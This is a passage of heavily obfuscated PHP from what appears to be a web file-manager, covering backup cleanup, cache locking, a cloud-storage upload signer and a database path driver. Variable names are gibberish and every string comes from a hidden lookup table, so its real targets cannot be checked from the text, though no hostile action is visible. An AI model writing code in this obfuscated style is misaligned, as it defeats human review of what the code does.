$_SERVER[¼¥ÊĞÙÌ]; if (self::$manual == 1) { return; } $ø¶’¦ıÚ = $this->model->listData(); if (empty($ø¶’¦ıÚ)) { return; } $Àñ¾ú²Õ = 0; $ì¿Œ‡É = array(); foreach ($ø¶’¦ıÚ as $±ø–ğµ) { if ($Àñ¾ú²Õ >= 7) { break; } $ì¿Œ‡É[] = $±ø–ğµ[$û»ö“Ü„[32]]; $Àñ¾ú²Õ++; } for ($Àñ¾ú²Õ = 0; $Àñ¾ú²Õ < 12; $Àñ¾ú²Õ++) { $ì¿Œ‡É[] = date($û»ö“Ü„[843], strtotime("\x2d{$Àñ¾ú²Õ}\40\155\157\156\x74\150\163")); } $ì¿Œ‡É = array_unique($ì¿Œ‡É); $¿âšÑÓä = Model($û»ö“Ü„[844])->get($û»ö“Ü„[845]); foreach ($ø¶’¦ıÚ as $±ø–ğµ) { if (isset($±ø–ğµ[$û»ö“Ü„[829]]) && $±ø–ğµ[$û»ö“Ü„[829]] == $û»ö“Ü„[91]) { continue; } if (!empty($±ø–ğµ[$û»ö“Ü„[32]]) && in_array($±ø–ğµ[$û»ö“Ü„[32]], $ì¿Œ‡É)) { continue; } $this->model->remove($±ø–ğµ[$û»ö“Ü„[478]]); $´È´—ˆ› = $this->backupPath($Ëöˆš—Ñ, $¿âšÑÓä); IO::remove($´È´—ˆ›, !1); } } private function backupPath($Ñ·öêğú, $Í¥¼ÖÊù = false) { $‹“’Ğêš =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Í¥¼ÖÊù) { $Í¥¼ÖÊù = Model($‹“’Ğêš[844])->get($‹“’Ğêš[845]); } $”ÖŸ»½ª = $Ñ·öêğú[$‹“’Ğêš[32]]; $ÅÕ—ü¾è = substr(md5($‹“’Ğêš[846] . $Í¥¼ÖÊù . $”ÖŸ»½ª), 0, 8); return "\x7b\151\157\x3a{$Ñ·öêğú[$‹“’Ğêš[826]]}\x7d\x2f\x64\141\x74\141\142\x61\x73\x65\57\142\141\x63\153\165\x70\57" . $”ÖŸ»½ª . $‹“’Ğêš[11] . $ÅÕ—ü¾è; } public function db() { $‚Ö§Ê¦† =& $_SERVER[¼¥ÊĞÙÌ]; $Ù°¡İï› = self::get(); if (_get($Ù°¡İï›, $‚Ö§Ê¦†[847], 0) == $‚Ö§Ê¦†[91]) { return !0; } $›ˆÄ€ = new BackupDb(); if (!$›ˆÄ€->index()) { return !1; } self::set(array($‚Ö§Ê¦†[847] => 1)); return !0; } public function dbFile() { $Ú¤‘Ú®ı =& $_SERVER[¼¥ÊĞÙÌ]; $Ò²ïÊû” = self::get(); if (_get($Ò²ïÊû”, $Ú¤‘Ú®ı[848], 0) == $Ú¤‘Ú®ı[91]) { return !0; } $Úß„¹ïİ = new BackupDbFile(); if (!$Úß„¹ïİ->index()) { return !1; } self::set(array($Ú¤‘Ú®ı[848] => 1)); return !0; } public function file() { $˜†Äƒ¾ü =& $_SERVER[¼¥ÊĞÙÌ]; $—å¥‹ØÈ = self::get(); if (_get($—å¥‹ØÈ, $˜†Äƒ¾ü[849], 0) == $˜†Äƒ¾ü[91]) { return !0; } if ($—å¥‹ØÈ[$˜†Äƒ¾ü[171]] == $˜†Äƒ¾ü[850]) { $Œãà ¿ = new BackupFile(); if (!$Œãà ¿->index()) { return !1; } } self::set(array($˜†Äƒ¾ü[849] => 1, $˜†Äƒ¾ü[824] => 1)); return !0; } public static function log($–•ìíö) { write_log($–•ìíö, $_SERVER[¼¥ÊĞÙÌ][851]); } } goto EÄ…Ç··ÉÀ; D™Œ¥Êò•å: function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ì¯ØÄ¿Û =& $_SERVER[¼¥ÊĞÙÌ]; $Õ²‘éı± = $GLOBALS[$ì¯ØÄ¿Û[6]][$ì¯ØÄ¿Û[427]]; self::$cachePath = $Õ²‘éı±[$ì¯ØÄ¿Û[233]][$ì¯ØÄ¿Û[87]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($â¯³™¥, $Ÿ»Ç¶ğş = 0) { $ƒ–¢Ü•” =& $_SERVER[¼¥ÊĞÙÌ]; $’Í’ŸÆô = microtime(!0); $¸æ˜ıÑ = $’Í’ŸÆô + $Ÿ»Ç¶ğş + 0.0001; $™õ½ÍÊ‚ = rtrim(self::$cachePath, $ƒ–¢Ü•”[8]) . $ƒ–¢Ü•”[944] . md5($â¯³™¥) . $ƒ–¢Ü•”[941]; if (file_exists($™õ½ÍÊ‚) && filemtime($™õ½ÍÊ‚) && filemtime($™õ½ÍÊ‚) < time() - 10) { @unlink($™õ½ÍÊ‚); } do { if (file_exists($™õ½ÍÊ‚)) { cacheLockWait(); continue; } $á¶ˆ¬·´ = fopen($™õ½ÍÊ‚, $ƒ–¢Ü•”[945]); if (!$á¶ˆ¬·´) { return !1; } $ëÕ®ú’Ò = flock($á¶ˆ¬·´, LOCK_EX | LOCK_NB); self::$caches[$â¯³™¥] = array($ƒ–¢Ü•”[946] => $á¶ˆ¬·´, $ƒ–¢Ü•”[233] => $™õ½ÍÊ‚); fwrite($á¶ˆ¬·´, $¸æ˜ıÑ); clearstatcache(); if ($á¶ˆ¬·´ && $ëÕ®ú’Ò) { return !0; } cacheLockWait(); } while (microtime(!0) < $¸æ˜ıÑ); $this->unlock($â¯³™¥); return !1; } public function lockGet($ ï¥ù¤) { $Öº¶¡ =& $_SERVER[¼¥ÊĞÙÌ]; $ÚÒ«»¯ = rtrim(self::$cachePath, $Öº¶¡[8]) . $Öº¶¡[944] . md5($ ï¥ù¤) . $Öº¶¡[941]; return file_exists($ÚÒ«»¯); } public function unlock($û‹Ğê©•) { $Ü¢Çöß =& $_SERVER[¼¥ÊĞÙÌ]; $ç ½œ = self::$caches[$û‹Ğê©•]; if (!$ç ½œ) { return; } @flock($ç ½œ[$Ü¢Çöß[946]], LOCK_UN); @fclose($ç ½œ[$Ü¢Çöß[946]]); @unlink($ç ½œ[$Ü¢Çöß[233]]); unset(self::$caches[$û‹Ğê©•]); } } class CacheLockRedis { public function lock($æ¤ÃÔ®, $¿±Õšòª = 10) { $‡‚Í´Ó´ = Cache::init(); $í„œ´î” = microtime(!0) + $¿±Õšòª; while (microtime(!0) < $í„œ´î”) { $½‹¤›Ïç = $‡‚Í´Ó´->get($æ¤ÃÔ®); if (!$½‹¤›Ïç) { $âÒÊ£Ğ = $‡‚Í´Ó´->setLock($æ¤ÃÔ®, $í„œ´î”, $¿±Õšòª); if ($âÒÊ£Ğ) { return !0; } } else { if ($½‹¤›Ïç < microtime(!0)) { $‡‚Í´Ó´->set($æ¤ÃÔ®, $í„œ´î”, $¿±Õšòª * 2); if ($‡‚Í´Ó´->get($æ¤ÃÔ®) === $½‹¤›Ïç) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($ØÎ…¡¼¾) { return Cache::init()->get($ØÎ…¡¼¾); } public function unlock($óşğËòÁ) { return Cache::init()->remove($óşğËòÁ); } } goto eÑÌ¦¥¿; EŒÃ‚Í¼¾Ò: class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ıê†œÊÉ) { parent::__construct($ıê†œÊÉ); $this->setSignVersion($_SERVER[¼¥ÊĞÙÌ][250]); } public function uploadFormData($ğ§—±¼“, $Ÿ¡¤ã¤ü = 3600) { $¹°¥ìË =& $_SERVER[¼¥ÊĞÙÌ]; $µé£ñ× = $¹°¥ìË[232]; $€«’Àß· = $¹°¥ìË[1431]; $Ã¶¨û†š = $¹°¥ìË[264]; $…­ˆ¤‚£ = gmdate($¹°¥ìË[1432], time() + $Ÿ¡¤ã¤ü); $ÕéÂãø = (string) time() . $¹°¥ìË[74] . (string) (time() + $Ÿ¡¤ã¤ü); $ô—é¬«µ = array($¹°¥ìË[265] => $…­ˆ¤‚£, $¹°¥ìË[268] => array(array($¹°¥ìË[309] => $µé£ñ×), array($¹°¥ìË[269] => $this->bucket), array($¹°¥ìË[270], $¹°¥ìË[271], $¹°¥ìË[12]), array($¹°¥ìË[273] => $Ã¶¨û†š), array($¹°¥ìË[1433] => $€«’Àß·), array($¹°¥ìË[1434] => $this->accessKey), array($¹°¥ìË[1435] => $ÕéÂãø))); $ô—é¬«µ = json_encode($ô—é¬«µ); $• Ğ†¤º = hash_hmac($¹°¥ìË[1431], $ÕéÂãø, $this->secret); $™şÄ´°¨ = sha1($ô—é¬«µ); $¡ü·ºË  = hash_hmac($¹°¥ìË[1431], $™şÄ´°¨, $• Ğ†¤º); $‘¥Â°ú§ = array($¹°¥ìË[309] => $µé£ñ×, $¹°¥ìË[273] => $Ã¶¨û†š, $¹°¥ìË[280] => base64_encode($ô—é¬«µ), $¹°¥ìË[1433] => $€«’Àß·, $¹°¥ìË[1434] => $this->accessKey, $¹°¥ìË[1436] => $ÕéÂãø, $¹°¥ìË[1437] => $¡ü·ºË , $¹°¥ìË[209] => $this->getHost()); return $‘¥Â°ú§; } public function fileOutImage($™ôüÉ½×, $½äÈ¼â— = 250) { $¹‹ßÃë =& $_SERVER[¼¥ÊĞÙÌ]; if ($this->size($™ôüÉ½×) > 1024 * 1024 * 32) { return $this->fileOutImageServer($™ôüÉ½×, $½äÈ¼â—); } $Ğüâ— = $this->link($™ôüÉ½×); $Ğüâ— .= $¹‹ßÃë[1438] . $½äÈ¼â— . $¹‹ßÃë[1439]; $this->fileOutLink($Ğüâ—); } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($‹§ïÑï) { $this->pathParse = $‹§ïÑï; $this->model = Model($_SERVER[¼¥ÊĞÙÌ][1440]); } public function getPath($×Æµ«»Ÿ) { return trim($×Æµ«»Ÿ, $_SERVER[¼¥ÊĞÙÌ][8]); } public function pathFather($ß»ÅÙ¾) { $â©Ù¹…¼ = $this->parse($ß»ÅÙ¾); $â©Ù¹…¼ = $this->infoSimple($ß»ÅÙ¾); return $â©Ù¹…¼ ? $â©Ù¹…¼[$_SERVER[¼¥ÊĞÙÌ][193]] : !1; } public function pathThis($¶Ú’ûÓª) { $˜ÈøµÖ = $this->infoSimple($¶Ú’ûÓª); return $˜ÈøµÖ ? $˜ÈøµÖ[$_SERVER[¼¥ÊĞÙÌ][32]] : !1; } public function getPathOuter($Ã°²¿Á‘) { if (!$Ã°²¿Á‘) { return $Ã°²¿Á‘; } $²º«—À° = $this->parse($Ã°²¿Á‘); return KodIO::make($²º«—À°[$_SERVER[¼¥ÊĞÙÌ][478]]); } public function copyFolderFromIO($à„òôŸ, $ïŸ¹Ãš‰, $˜Æ„æåæ, $˜Ì”ù†Î, $Ş¤ùêƒ) { $–Ğ…ÏÉì = $this->model->copyFolderFromIO($à„òôŸ, $ïŸ¹Ãš‰, $˜Æ„æåæ, $˜Ì”ù†Î, $Ş¤ùêƒ); return KodIO::make($–Ğ…ÏÉì); } public function isParentOf($µÀÅÜâ, $üÚ„²ÙÈ) { return $this->model->isParentOf($µÀÅÜâ, $üÚ„²ÙÈ); } public function mkfile($ûó‡‘ ³, $Ê¬”€ê‚ = '', $ı©´ÑÇ = REPEAT_RENAME) { $ÈÕµ‡€ê =& $_SERVER[¼¥ÊĞÙÌ]; $²¥÷…€ï = $this->parse($ûó‡‘ ³); $ûó‡‘ ³ = $²¥÷…€ï[$ÈÕµ‡€ê[478]]; for ($ÖÛÀÆÇö = 0; $ÖÛÀÆÇö < count($²¥÷…€ï[$ÈÕµ‡€ê[1441]]); $ÖÛÀÆÇö++) { $“å’€ø = $²¥÷…€ï[$ÈÕµ‡€ê[1441]][$ÖÛÀÆÇö]; if ($ÖÛÀÆÇö == count($²¥÷…€ï[$ÈÕµ‡€ê[1441]]) - 1) { $ûó‡‘ ³ = $this->model->mkfile($ûó‡‘ ³, $“å’€ø, $Ê¬”€ê‚, $ı©´ÑÇ); break; } $ûó‡‘ ³ = $this->model->mkdir($ûó‡‘ ³, $“å’€ø, REPEAT_SKIP); } return $this->getPathOuter($ûó‡‘ ³); } public function mkdir($îŸáÜÌ, $İœ¯‰Öğ = REPEAT_SKIP) { $Š÷¡¯¬Ÿ =& $_SERVER[¼¥ÊĞÙÌ]; $ùô «£Å = $this->parse($îŸáÜÌ); $îŸáÜÌ = $ùô «£Å[$Š÷¡¯¬Ÿ[478]]; for ($˜¯ŒÁÁ† = 0; $˜¯ŒÁÁ† < count($ùô «£Å[$Š÷¡¯¬Ÿ[1441]]); $˜¯ŒÁÁ†++) { $ì¬É°ªŞ = $ùô «£Å[$Š÷¡¯¬Ÿ[1441]][$˜¯ŒÁÁ†]; $îŸáÜÌ = $this->model->mkdir($îŸáÜÌ, $ì¬É°ªŞ, $İœ¯‰Öğ); } return $this->getPathOuter($îŸáÜÌ); } public function copyFile($æ™µ¼º, $È·³½®¸, $‘ÕÂ½®ö = REPEAT_REPLACE) { $ÚéÉ¼×è =& $_SERVER[¼¥ÊĞÙÌ]; $£‡áíü = $this->parse($È·³½®¸); $Óçæ’¶è = $this->model->copy($æ™µ¼º, $£‡áíü[$ÚéÉ¼×è[478]], $‘ÕÂ½®ö, $£‡áíü[$ÚéÉ¼×è[87]]); return $Óçæ’¶è ? $this->getPathOuter($Óçæ’¶è) : !1; } public function moveFile($ şµÆÕ®, $—£îó¼, $±¯šÌ¿Ó = REPEAT_REPLACE) { $ªÅ±ºø– =& $_SERVER[¼¥ÊĞÙÌ]; $êô¨ğâÇ = $this->parse($—£îó¼); $Ú£È±Ö = $this->model->move($ şµÆÕ®, $êô¨ğâÇ[$ªÅ±ºø–[478]], $±¯šÌ¿Ó, $êô¨ğâÇ[$ªÅ±ºø–[87]]); return $Ú£È±Ö ? $this->getPathOuter($Ú£È±Ö) : !1; } public function copy($¥ìœÀØµ, $ŞÇÖ©›Ö, $‚éÜÆĞĞ = REPEAT_REPLACE, $†ğßµÈ× = false) { $È™›Æ = $this->parse($ŞÇÖ©›Ö); $¥±“§·â = $this->model->copy($¥ìœÀØµ, $È™›Æ[$_SERVER[¼¥ÊĞÙÌ][478]], $‚éÜÆĞĞ, $†ğßµÈ×); return $¥±“§·â ? $this->getPathOuter($¥±“§·â) : !1; } public function moveSameAllow() { } public function move($Š•¸íÜÂ, $ô¦Áìå˜, $ÃÅõÑÌ„ = REPEAT_REPLACE, $ò´è±„Í = false) { $—†›½Óî = $this->parse($ô¦Áìå˜); $³èãˆÖ‘ = $this->model->move($Š•¸íÜÂ, $—†›½Óî[$_SERVER[¼¥ÊĞÙÌ][478]], $ÃÅõÑÌ„, $ò´è±„Í); return $³èãˆÖ‘ ? $this->getPathOuter($³èãˆÖ‘) : !1; } public function remove($ ·§ÑĞå, $¾·ìˆİÃ = true) { return $this->model->remove($ ·§ÑĞå, $¾·ìˆİÃ); } public function rename($ßù¹Ô»´, $²ìŒ‚Ï”) { $ÖŠÖş©­ = $this->model->rename($ßù¹Ô»´, $²ìŒ‚Ï”); return $ÖŠÖş©­ ? $this->getPathOuter($ßù¹Ô»´) : $ÖŠÖş©­; } public function size($ÈÀÓßíÌ) { $…ÁÏÜŞ = $this->infoSimple($ÈÀÓßíÌ); return $…ÁÏÜŞ ? $…ÁÏÜŞ[$_SERVER[¼¥ÊĞÙÌ][79]] : 0; } public function infoSimple($÷‰²± ) { return $this->model->sourceInfo($÷‰²± ); } public function info($…‹œØé‰) { return $this->infoParse($…‹œØé‰); } public function infoAuth($ß«ÙŸš¼) { return $this->infoParse($ß«ÙŸš¼, !1, !0); } public function infoWithChildren($×¦øà¢…) { return $this->infoParse($×¦øà¢…, !0); } protected function infoParse($–èİö¬‚, $º¸ÅË = false, $ÄÄ§×‘· = false) { if (!$º¸ÅË) { return $this->model->pathInfo($–èİö¬‚, $ÄÄ§×‘·); } return $this->model->pathInfoMore($–èİö¬‚); } public function infoFullSimple($™Œ™ìºÌ) { $ƒ»çä¸ =& $_SERVER[¼¥ÊĞÙÌ]; $»íÇ¤É­ = explode($ƒ»çä¸[8], $™Œ™ìºÌ); $¸´¶£ûÊ = implode($ƒ»çä¸[8], array_splice($»íÇ¤É­, 1)); return $this->model->pathInfoByPath($»íÇ¤É­[0], $¸´¶£ûÊ); } public function infoFull($Áã¸ˆè‡) { $‚İ†Ñã = $this->infoFullSimple($Áã¸ˆè‡); return is_array($‚İ†Ñã) ? $this->model->pathInfo($‚İ†Ñã[$_SERVER[¼¥ÊĞÙÌ][194]]) : !1; } public function hashSimple($„¤„ƒ·¸) { $ÌõËœÃÄ =& $_SERVER[¼¥ÊĞÙÌ]; $ƒçÈşÌÙ = $this->infoWithChildren($„¤„ƒ·¸); return $ƒçÈşÌÙ[$ÌõËœÃÄ[170]][$ÌõËœÃÄ[680]]; } public function hashMd5($š«ñ¸®¬) { $ÆÇìÖâÎ =& $_SERVER[¼¥ÊĞÙÌ]; $òÔîç¨› = $this->infoWithChildren($š«ñ¸®¬); return $òÔîç¨›[$ÆÇìÖâÎ[170]][$ÆÇìÖâÎ[552]]; } public function exist($¯¼ÛŒ û) { $µ­›ğãè =& $_SERVER[¼¥ÊĞÙÌ]; $•½Ò­»¢ = $this->parse($¯¼ÛŒ û); if (!$•½Ò­»¢[$µ­›ğãè[87]]) { return $this->isFile($¯¼ÛŒ û) || $this->isFolder($¯¼ÛŒ û); } $ş¢…ò€ù = array($µ­›ğãè[480] => $•½Ò­»¢[$µ­›ğãè[478]], $µ­›ğãè[32] => $•½Ò­»¢[$µ­›ğãè[87]]); $€¦†¥á¦ = $this->model->where($ş¢…ò€ù)->find(); return $€¦†¥á¦ ? !0 : !1; } public function isFile($êõÒ„õ) { $›¾ˆ¸ïú =& $_SERVER[¼¥ÊĞÙÌ]; $¥Ğ‡Ôõ = $this->infoSimple($êõÒ„õ); return $¥Ğ‡Ôõ && $¥Ğ‡Ôõ[$›¾ˆ¸ïú[488]] == $›¾ˆ¸ïú[231] ? !0 : !1; } public function isFolder($Ù°ĞÖ¸²) { $—‚õÒ€ =& $_SERVER[¼¥ÊĞÙÌ]; $Ó¢ô…¬Ş = $this->infoSimple($Ù°ĞÖ¸²); return $Ó¢ô…¬Ş && $Ó¢ô…¬Ş[$—‚õÒ€[488]] == $—‚õÒ€[91] ? !0 : !1; } public function listPath($“’ÜÖü , $ƒĞ¦Û™ô = false) { $æ©şËÒ¥ =& $_SERVER[¼¥ÊĞÙÌ]; if ($“’ÜÖü  == $æ©şËÒ¥[12]) { return !1; } $Ë“““ = array($æ©şËÒ¥[480] => $“’ÜÖü ); if ($ƒĞ¦Û™ô) { return $this->model->listSource($Ë“““, -1); } return $this->model->listSource($Ë“““); } public function has($Ûæğì®, $ÇÇ³ØÂü = false, $Ö´Õáş = null) { $şÑ™·Ü =& $_SERVER[¼¥ÊĞÙÌ]; $¬ˆª¸³Ò = $this->infoWithChildren($Ûæğì®); if ($ÇÇ³ØÂü) { return array($şÑ™·Ü[243] => $¬ˆª¸³Ò[$şÑ™·Ü[243]], $şÑ™·Ü[242] => $¬ˆª¸³Ò[$şÑ™·Ü[242]]); } return $Ö´Õáş ? $¬ˆª¸³Ò[$şÑ™·Ü[243]] : $¬ˆª¸³Ò[$şÑ™·Ü[242]]; } public function listAll($˜¬Ü¼±µ) { $ğ±Æ£—Ï = IO::info($this->pathParse[$_SERVER[¼¥ÊĞÙÌ][87]]); if (!$ğ±Æ£—Ï) { return array(); } return $this->model->listAll($˜¬Ü¼±µ); } public function getContent($êÈò¹È¬) { return $this->model->getContent($êÈò¹È¬); } public function setContent($éÂ’©, $£²Ñ¡Ï = '') { return $this->model->setContent($éÂ’©, $£²Ñ¡Ï); } public function fileSubstr($ÌšÎ¾Œç, $½Šİ·×¡, $Ñö±³Ìı) { return $this->model->fileSubstr($ÌšÎ¾Œç, $½Šİ·×¡, $Ñö±³Ìı); } public function download($ì²ÃæÜ–, $£ÁâÍöà = '') { $úò‡ÑÇ° = get_path_father($£ÁâÍöà); $‰ä˜Šı£ = get_path_this($£ÁâÍöà); $’–½í¶“ = $this->model->fileInfoGet($ì²ÃæÜ–); $ğ¡£Úë = IO::copy($’–½í¶“[$_SERVER[¼¥ÊĞÙÌ][87]], $úò‡ÑÇ°, !1, $‰ä˜Šı£); return $ğ¡£Úë; } public function setModifyTime($‹èÊÌİÀ, $¡¦ê’Òå = '') { $ª©ßÚ =& $_SERVER[¼¥ÊĞÙÌ]; if (!$‹èÊÌİÀ) { return; } $this->model->where(array($ª©ßÚ[494] => $‹èÊÌİÀ))->save(array($ª©ßÚ[88] => $¡¦ê’Òå)); } public function upload($œ˜šÑ™ç, $ßÑ˜¡¸ì, $·ª­ÈòÍ = false, $Ê›ú£ÊÚ = REPEAT_REPLACE) { $ì×†—½ =& $_SERVER[¼¥ÊĞÙÌ]; $ßŒ·®·‚ = $this->parse($œ˜šÑ™ç); $¸–ÅÑ—‚ = $this->model->addFile($ßŒ·®·‚[$ì×†—½[478]], $ßÑ˜¡¸ì, $ßŒ·®·‚[$ì×†—½[87]], $·ª­ÈòÍ, $Ê›ú£ÊÚ); return $this->getPathOuter($¸–ÅÑ—‚); } public function uploadFileByID($çèœ¯çµ, $È²…ç¼‘, $¾‚¬À·) { $²¼İŸƒî =& $_SERVER[¼¥ÊĞÙÌ]; $¥¤õÜ€³ = $this->parse($çèœ¯çµ); $ª¦°§ = $this->model->addFileByFileID($¥¤õÜ€³[$²¼İŸƒî[478]], $È²…ç¼‘, $¥¤õÜ€³[$²¼İŸƒî[87]], $¾‚¬À·); return $this->getPathOuter($ª¦°§); } public function addFileByRemote($áù¸ À, $Üë¹¬Œ, $Íøª‡áş = array(), $üñ›û¶ù = '', $âÖïçß¢) { $ûèƒ°ªÊ =& $_SERVER[¼¥ÊĞÙÌ]; $Õ†òüä = $this->parse($áù¸ À); $üñ›û¶ù = empty($üñ›û¶ù) ? $Õ†òüä[$ûèƒ°ªÊ[87]] : $üñ›û¶ù; $»İòúÎ™ = $this->model->addFileByRemote($Õ†òüä[$ûèƒ°ªÊ[478]], $Üë¹¬Œ, $üñ›û¶ù, $Íøª‡áş, $âÖïçß¢); return $this->getPathOuter($»İòúÎ™); } public function uploadLink($”ßÒÕ‡¡, $²£†ï«è = 0) { $î‚Ã¦¡€ =& $_SERVER[¼¥ÊĞÙÌ]; $’™¨ş‚÷ = $this->parse($”ßÒÕ‡¡); $‡ó„ = _get($GLOBALS[$î‚Ã¦¡€[7]], $î‚Ã¦¡€[1442]); $³ß—Ş = _get($GLOBALS[$î‚Ã¦¡€[7]], $î‚Ã¦¡€[1443]); $¦€ÜÛ£Ö = KodIO::ioFileDriverGet($î‚Ã¦¡€[486] . $’™¨ş‚÷[$î‚Ã¦¡€[478]] . $î‚Ã¦¡€[405]); $õ•Ì¦¨Ö = Model($î‚Ã¦¡€[682])->createFileName($’™¨ş‚÷[$î‚Ã¦¡€[87]], $¦€ÜÛ£Ö, $‡ó„, $³ß—Ş); return IO::uploadLink($õ•Ì¦¨Ö, $²£†ï«è); } public function fileNameAuto($ï­„û­, $ó¹Ïòç´, $âî‹üÇ = REPEAT_REPLACE, $Öç·½‰á = false) { return $this->model->fileNameAuto($ï­„û­, $ó¹Ïòç´, $âî‹üÇ, $Öç·½‰á); } public function fileNameExist($ö«Ëæ‘ü, $óı©¨øú) { return $this->model->fileNameExist($ö«Ëæ‘ü, $óı©¨øú); } protected function _fileOut($™ù²˜ß, $š×ÛõÃµ = false, $¶¢ë¸ô = false, $Ç¼Ê£· = '', $â‘ÌéÒ˜ = false) { $å•àÛë =& $_SERVER[¼¥ÊĞÙÌ]; $Ï˜şËª¸ = $this->model->sourceInfo($™ù²˜ß); if ($Ï˜şËª¸[$å•àÛë[488]] == $å•àÛë[91]) { header($å•àÛë[1444]); die; } $î€şÔ×Ô = $this->model->fileInfoGet($™ù²˜ß); $Ç¼Ê£· = $î€şÔ×Ô[$å•àÛë[552]] ? $î€şÔ×Ô[$å•àÛë[552]] : $Ç¼Ê£·; $ ÒĞ©„Ü = isset($GLOBALS[$å•àÛë[183]]) && is_array($GLOBALS[$å•àÛë[183]]) ? $GLOBALS[$å•àÛë[183]][$å•àÛë[32]] : $Ï˜şËª¸[$å•àÛë[32]]; if ($â‘ÌéÒ˜) { return IO::fileOutServer($î€şÔ×Ô[$å•àÛë[87]], $š×ÛõÃµ, $ ÒĞ©„Ü, $Ç¼Ê£·); } IO::fileOut($î€şÔ×Ô[$å•àÛë[87]], $š×ÛõÃµ, $ ÒĞ©„Ü, $Ç¼Ê£·); } public function fileOut($ÚåÕƒ«Ã, $¥ã…¶Ò = false, $Ìê”š¾È = false, $àŠâ¤Ç¤ = '') { $this->_fileOut($ÚåÕƒ«Ã, $¥ã…¶Ò, $Ìê”š¾È, $àŠâ¤Ç¤); } public function fileOutServer($ şæÄ×ƒ, $µ¿³ëƒ· = false, $†¿Òú–« = false, $Ùõœ¨Â = '') { $this->_fileOut($ şæÄ×ƒ, $µ¿³ëƒ·, $†¿Òú–«, $Ùõœ¨Â, !0); } protected function _fileOutImage($‘Ùû‘á–, $É¿Ä·‚Ã = 250) { $­Ö¾‰ÜÁ =& $_SERVER[¼¥ÊĞÙÌ]; $ç»éáºÃ = $this->model->pathInfo($‘Ùû‘á–); if ($ç»éáºÃ[$­Ö¾‰ÜÁ[488]] == $­Ö¾‰ÜÁ[91]) { show_json($­Ö¾‰ÜÁ[1445] . $‘Ùû‘á–, !1); } $ª”¤¦»¡ = $this->model->fileInfoGet($‘Ùû‘á–); $ç»éáºÃ[$­Ö¾‰ÜÁ[184]] = $ª”¤¦»¡[$­Ö¾‰ÜÁ[87]]; $GLOBALS[$­Ö¾‰ÜÁ[183]] = $ç»éáºÃ; IO::fileOutImage($ª”¤¦»¡[$­Ö¾‰ÜÁ[87]], $É¿Ä·‚Ã); } public function fileOutImage($¢¡Şù Œ, $çÏÛ¯®Ë = 250) { $this->_fileOutImage($¢¡Şù Œ, $çÏÛ¯®Ë); } public function fileOutImageServer($¤ã ¶¡„, $ïûÛò×À = 250) { $this->_fileOutImage($¤ã ¶¡„, $ïûÛò×À); } public function link($‚õïùÎœ, $ƒ™®Ïšç = '') { $ì¦³é£Õ = $this->model->fileInfoGet($‚õïùÎœ); return IO::link($ì¦³é£Õ[$_SERVER[¼¥ÊĞÙÌ][87]], $ƒ™®Ïšç); } protected function parse($ÊÚâ­¯¬) { $ÊÉé‘›Ä =& $_SERVER[¼¥ÊĞÙÌ]; if (strstr($ÊÚâ­¯¬, $ÊÉé‘›Ä[8]) === !1) { return array($ÊÉé‘›Ä[496] => intval($ÊÚâ­¯¬), $ÊÉé‘›Ä[87] => $ÊÉé‘›Ä[12], $ÊÉé‘›Ä[1441] => array()); } $é·—ëšË = explode($ÊÉé‘›Ä[8], trim($ÊÚâ­¯¬, $ÊÉé‘›Ä[8])); if (count($é·—ëšË) < 2) { show_tips(clear_html($ÊÚâ­¯¬) . $ÊÉé‘›Ä[1446]); } return array($ÊÉé‘›Ä[496] => intval($é·—ëšË[0]), $ÊÉé‘›Ä[87] => $é·—ëšË[1], $ÊÉé‘›Ä[1441] => array_slice($é·—ëšË, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÕŞÄê®“) { $this->pathParse = $ÕŞÄê®“; $this->model = Model($_SERVER[¼¥ÊĞÙÌ][1440]); } public function getPathOuter($Î¹Ï‰Ö“) { $İ¿¸”ã² =& $_SERVER[¼¥ÊĞÙÌ]; if (!$Î¹Ï‰Ö“) { return $Î¹Ï‰Ö“; } $ÚÁ»Ö—™ = $this->parse($Î¹Ï‰Ö“); return trim(KodIO::makeShare($this->pathParse[$İ¿¸”ã²[478]], $ÚÁ»Ö—™[$İ¿¸”ã²[478]]), $İ¿¸”ã²[8]); } protected function infoParse($šÎ®¦“§, $ƒªŒÊñÃ = false, $É¨ùí—Ç = false) { $…Øé›ŠÔ =& $_SERVER[¼¥ÊĞÙÌ]; $ê¹Şß¨ = $this->pathParse[$…Øé›ŠÔ[478]]; $Ú½—„ = trim($this->pathParse[$…Øé›ŠÔ[1261]], $…Øé›ŠÔ[8]); return Action($…Øé›ŠÔ[1447])->sharePathInfo($ê¹Şß¨, $Ú½—„, $ƒªŒÊñÃ); } public function infoFull($ºë•Îï) { $ÌíÇùÁ =& $_SERVER[¼¥ÊĞÙÌ]; $Ä”äÙé = explode($ÌíÇùÁ[8], trim($ºë•Îï, $ÌíÇùÁ[8])); if (count($Ä”äÙé) > 1) { $ê›€°•Ê = implode($ÌíÇùÁ[8], array_splice($Ä”äÙé, 1)); $°‘ğŸ—¨ = $this->model->pathInfoByPath($Ä”äÙé[0], $ê›€°•Ê); if (!$°‘ğŸ—¨) { return !1; } $this->pathParse[$ÌíÇùÁ[1261]] = $°‘ğŸ—¨[$ÌíÇùÁ[194]]; } return $this->infoParse($ºë•Îï); } public function listAll($¸ÂèÁĞˆ) { $Õâ½Åìš =& $_SERVER[¼¥ÊĞÙÌ]; $Æ°ºî€¹ = IO::info($this->pathParse[$Õâ½Åìš[87]]); if (!$Æ°ºî€¹) { return array(); } $È‘ö³ö» = $this->model->listAll($¸ÂèÁĞˆ); $©œ€™¾ƒ = Model($Õâ½Åìš[672])->getInfo($Æ°ºî€¹[$Õâ½Åìš[673]]); foreach ($È‘ö³ö» as &$™óµ‡ª) { check_abort(); $™óµ‡ª[$Õâ½Åìš[90]] = Action($Õâ½Åìš[1447])->_shareItemeParse($™óµ‡ª[$Õâ½Åìš[90]], $©œ€™¾ƒ); } unset($™óµ‡ª); return $È‘ö³ö»; } } goto fÀ¥Ãè†§; C®Õï²‡š: class AnalysisModel extends ModelBaseLight { public function init($÷ªÊ¥ùÀ) { $»¾ªš½ =& $_SERVER[¼¥ÊĞÙÌ]; $©—õ€êª = array($»¾ªš½[670] => array($»¾ªš½[33] => $»¾ªš½[1920], $»¾ªš½[353] => array($»¾ªš½[285], 